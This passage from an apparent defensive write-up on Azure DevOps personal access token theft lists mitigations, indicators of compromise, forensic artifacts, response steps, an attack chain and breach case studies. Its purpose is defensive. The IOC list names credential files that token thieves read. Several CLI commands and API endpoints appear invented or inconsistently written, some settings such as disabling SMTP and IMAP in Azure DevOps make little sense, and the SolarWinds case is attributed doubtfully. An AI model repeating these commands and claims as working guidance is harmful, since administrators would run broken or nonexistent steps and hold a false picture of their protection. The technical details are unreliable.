
```powershell
# Requires Azure DevOps PowerShell module
$orgUrl = "https://dev.azure.com/contoso"

# Set PAT maximum age policy
az devops admin policy-list-show --organization $orgUrl | ConvertFrom-Json

# Apply policy via REST API
$headers = @{
    "Authorization" = "Bearer $PAT"
    "Content-Type" = "application/json"
}

$policyPayload = @{
    "maxExpireDate" = (Get-Date).AddDays(30).ToUniversalTime()
    "enforcePatExpiration" = $true
} | ConvertTo-Json

Invoke-RestMethod -Uri "$orgUrl/_apis/admin/policies/pat?api-version=7.0-preview" -Method PATCH -Headers $headers -Body $policyPayload
```

**Validation Command:**

```powershell
# Check current PAT policies
az devops admin policy list-show --organization https://dev.azure.com/contoso
```

**Expected Output (If Secure):**

```
{
  "patLifetimeInDays": 30,
  "enforcePatExpiration": true,
  "patInactivityTimeoutInDays": 14
}
```

**What to Look For:**
- `patLifetimeInDays` should be 30 or less
- `enforcePatExpiration` should be `true`

---

**Mitigation 2: Restrict PAT Creation (Public Preview)**

Azure DevOps recently released a feature to restrict which users can create PATs.

**Applies To Versions:** Azure DevOps Services 2024+

**Manual Steps:**

1. Go to **Azure DevOps Portal** → **Organization Settings**
2. Navigate to **Security** → **Policies**
3. Under **Personal Access Token Restrictions**, enable:
   - **Restrict who can create PATs**: `ON`
   - **Allowed Users**: [Select only required roles, e.g., "Project Administrators"]
4. Click **Save**

---

**Mitigation 3: Require Multi-Factor Authentication (MFA) for PAT Creation**

Enforce MFA when creating PATs to prevent phishing-based PAT generation.

**Applies To Versions:** Azure Entra ID (prerequisite for Azure DevOps)

**Manual Steps (Conditional Access):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Require MFA for Azure DevOps PAT Creation`
4. **Assignments:**
   - Users: **All users** (or select specific developer groups)
   - Cloud apps: **Azure DevOps**
   - Conditions: **Client app** = **Azure DevOps CLI**
5. **Access controls:**
   - Grant: **Require multi-factor authentication**
6. Enable policy: **On**
7. Click **Create**

---

### Priority 2: HIGH

**Mitigation 4: Monitor and Audit PAT Usage**

Enable comprehensive logging and alerting on PAT creation and usage.

**Applies To Versions:** All Azure DevOps versions

**Manual Steps (Azure DevOps):**

1. Go to **Organization Settings** → **Auditing**
2. Ensure the following events are logged:
   - Personal Access Token (PAT) Created
   - Personal Access Token (PAT) Revoked
   - Personal Access Token (PAT) Used
3. Set retention policy: **90-180 days**
4. Export logs to **Azure Storage** or **Log Analytics** for long-term retention

---

**Mitigation 5: Disable Legacy Authentication Protocols**

Disable SMTP, IMAP, and other legacy protocols that may accept PATs.

**Manual Steps (Azure DevOps):**

1. Go to **Organization Settings** → **Security** → **Policies**
2. Under **Authentication Methods**, ensure:
   - **Allow Basic Auth**: `OFF`
   - **Allow NTLM**: `OFF`
   - **Allow legacy auth tokens**: `OFF`
3. Click **Save**

---

**Mitigation 6: Implement Principle of Least Privilege (PoLP)**

Scope PATs to minimal required permissions and grant them to service accounts, not personal accounts.

**Manual Steps:**

1. When creating a PAT, select only necessary scopes:
   - Avoid: `Full (all scopes)`
   - Prefer: Specific scopes like `vso.code_write`, `vso.build_execute`
2. Create separate PATs for different workflows (e.g., one for CI/CD, one for Git operations)
3. Never reuse PATs across multiple pipelines or projects

---

## 13. Detection & Incident Response

### Indicators of Compromise (IOCs)

- **Files:** PAT cached in `$HOME/.azure/devops`, `$HOME/.azure/defaults`, `.git/credentials`
- **Registry (Windows):** `HKLM\Software\Microsoft\Windows\CurrentVersion\Authentication` (if PAT cached in Windows Credential Manager)
- **Network:** Outbound HTTPS connections to `dev.azure.com` API endpoints (`_apis/projects`, `_apis/repos`) from unusual IP addresses or times
- **Process:** `az.cmd`, `git.exe`, `curl.exe` spawned with `--pat-token` or `AZURE_DEVOPS_PAT` environment variables

### Forensic Artifacts

- **Disk:** `~/.azure/devops` (plaintext or encrypted depending on system), `~/.git-credentials`, `~/.ssh/config` (if SSH key used)
- **Memory:** Stolen PAT in process memory of `az devops` CLI process or PowerShell process
- **Cloud (Azure DevOps Audit Log):** Operations like `CreatePersonalAccessToken`, repository clones, pipeline modifications, secret access
- **Cloud (Azure Entra ID):** Sign-ins to Azure DevOps from unexpected locations or times, unusual OAuth consent approvals

### Response Procedures

1. **Isolate:**
   - **Command (Immediate):**
   ```powershell
   # Revoke all PATs for affected user
   $PAT = "[Known-Good-Admin-PAT]"
   $headers = @{
       "Authorization" = "Bearer $PAT"
       "Content-Type" = "application/json"
   }
   
   # Get list of all PATs for user
   Invoke-RestMethod -Uri "https://vssps.dev.azure.com/_apis/tokens/pats?api-version=7.0-preview" -Headers $headers
   
   # Revoke each PAT
   Invoke-RestMethod -Uri "https://vssps.dev.azure.com/_apis/tokens/pats/{patId}?api-version=7.0-preview" -Method DELETE -Headers $headers
   ```

   **Manual (Azure DevOps Portal):**
   - Go to **User Settings** → **Personal Access Tokens**
   - Click **Revoke** on all tokens created after the compromise window
   - Notify the user to re-authenticate via browser

2. **Collect Evidence:**
   - **Command:**
   ```powershell
   # Export Azure DevOps audit logs
   $orgUrl = "https://dev.azure.com/contoso"
   az devops security audit-stream list --organization $orgUrl
   
   # Export to file
   az devops security audit-stream show --organization $orgUrl > C:\Evidence\AuditLog.json
   ```

   - **Manual:**
   - Navigate to **Organization Settings** → **Auditing**
   - Filter logs by date range of suspected compromise
   - Export to CSV: **Download Audit Log**

3. **Remediate:**
   - Reset affected user's password in Entra ID
   - Review Entra ID sign-in logs for unauthorized access
   - Audit all repositories and pipelines modified during the compromise window
   - Check for injected malicious code or exfiltrated secrets
   - Rotate any secrets that may have been exposed in CI/CD pipelines
   - Conduct password audit on accounts that may have been compromised via exfiltrated secrets

---

## 14. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker phishes developer to grant OAuth permissions |
| **2** | **Credential Access** | **[CA-TOKEN-008] Azure DevOps PAT Theft** | **Attacker generates or steals PAT via phishing or endpoint compromise** |
| **3** | **Lateral Movement** | [LM-AUTH-005] Service Principal Key/Certificate | PAT used to extract service principal credentials from pipeline |
| **4** | **Privilege Escalation** | [PE-ACCTMGMT-010] Azure DevOps Pipeline Escalation | Attacker modifies pipeline to grant themselves admin role |
| **5** | **Impact** | [CA-UNSC-015] Pipeline Environment Variables Theft | Attacker exfiltrates cloud credentials from pipeline environment |

---

## 15. Real-World Examples

### Example 1: SUNBURST (SolarWinds 2020)

- **Target:** SolarWinds, U.S. Treasury, CISA
- **Timeline:** September 2019 - December 2020
- **Technique Status:** Attackers compromised SolarWinds' Azure DevOps build pipeline and injected backdoored code into Orion software updates
- **Impact:** Thousands of organizations compromised; supply chain attack affecting government agencies and Fortune 500 companies
- **Reference:** [CISA SolarWinds Advisory](https://www.cisa.gov/news-events/alerts/2020/12/13/cisa-issues-emergency-directive-regarding-solarwinds-orion-platform)

### Example 2: Codecov 2021 (CI/CD Secret Exposure)

- **Target:** Codecov (SaaS code coverage platform)
- **Timeline:** January 2021 - April 2021
- **Technique Status:** Attackers compromised Codecov's CI/CD pipeline (which had hardcoded authentication credentials), gained access to customer build logs containing AWS keys, GitHub tokens, and Azure credentials
- **Impact:** Thousands of organizations exposed; credentials from CI/CD logs leaked
- **Reference:** [Codecov Breach Report](https://codecov.io/security/incident-response)

### Example 3: Lapsus$ Campaign (Microsoft, Okta, Samsung 2022)

- **Target:** Microsoft, Okta, Samsung, others
- **Timeline:** Late 2021 - Early 2022
- **Technique Status:** Extortion group compromised developers via phishing and credential stuffing, accessed internal Azure DevOps repositories, and leaked source code
- **Impact:** Source code for Windows, Office, and other Microsoft products leaked; millions in extortion attempts
- **Reference:** [Microsoft Security Blog on Lapsus$](https://www.microsoft.com/en-us/security/blog/2022/03/22/helpful-security-guidance-following-active-exploitation-of-br-and-lapsus-tactics/)

---

**Related Techniques in MCADDF:**
- [REC-CLOUD-002] ROADtools Entra ID Enumeration
- [IA-PHISH-002] Consent Grant OAuth Attacks
- [CA-TOKEN-001] Hybrid AD Cloud Token Theft
- [CA-TOKEN-005] OAuth Access Token Interception
- [PE-ACCTMGMT-010] Azure DevOps Pipeline Escalation
- [LM-AUTH-005] Service Principal Key/Certificate Abuse

---
